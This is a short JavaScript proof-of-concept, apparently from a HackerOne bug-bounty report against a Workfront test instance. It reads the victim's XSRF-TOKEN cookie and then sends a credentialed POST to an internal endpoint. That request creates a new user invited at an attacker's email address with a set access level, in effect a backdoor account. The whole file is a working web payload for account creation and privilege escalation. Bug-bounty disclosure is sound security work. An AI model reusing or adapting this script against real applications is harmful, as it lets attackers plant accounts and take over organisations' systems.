function getCookieValue(cookieName) {
    // Step 1: Get the Cookie String
    var cookieString = document.cookie;

    // Step 2: Parse the Cookie String
    var cookies = cookieString.split(';');

    // Step 3: Search for the Specific Cookie
    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i].trim();

        // Step 4: Extract the Value
        if (cookie.indexOf(cookieName + '=') === 0) {
            return cookie.substring(cookieName.length + 1);
        }
    }

    // Return null if the cookie is not found
    return null;
}

// Example Usage:
var myCookieValue = getCookieValue('XSRF-TOKEN');

var xhr = new XMLHttpRequest();
var url = 'https://hackerone-ongoing-0ql224.testdrive.workfront.com/internal/user/add';
var params = 'objCode=USER&form=%7B%22objCode%22%3A%22USER%22%2C%22ID%22%3A%22%22%2C%22companyID%22%3A%22%22%2C%22externalUsersGroupID%22%3A%22%22%2C%22firstName%22%3A%22Hackerone%22%2C%22lastName%22%3A%22Example%22%2C%22emailAddr%22%3A%22attacker%40hackerone.com%22%2C%22inviteUser%22%3Atrue%2C%22accessLevelID%22%3A%22657c32f20007212079c3ccb3e4d91216%22%2C%22homeGroupID%22%3A%22657c32f300072247b40b72c545b96a33%22%2C%22continue%22%3A%22false%22%7D&objID=';

xhr.open('POST', url, true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
xhr.setRequestHeader('X-Xsrf-Token', myCookieValue);
xhr.withCredentials = true;  // Include credentials (cookies) in the request

xhr.onreadystatechange = function() {
  if (xhr.readyState == 4 && xhr.status == 200) {
    // Handle the response here
    console.log(xhr.responseText);
  }
};

xhr.send(params);
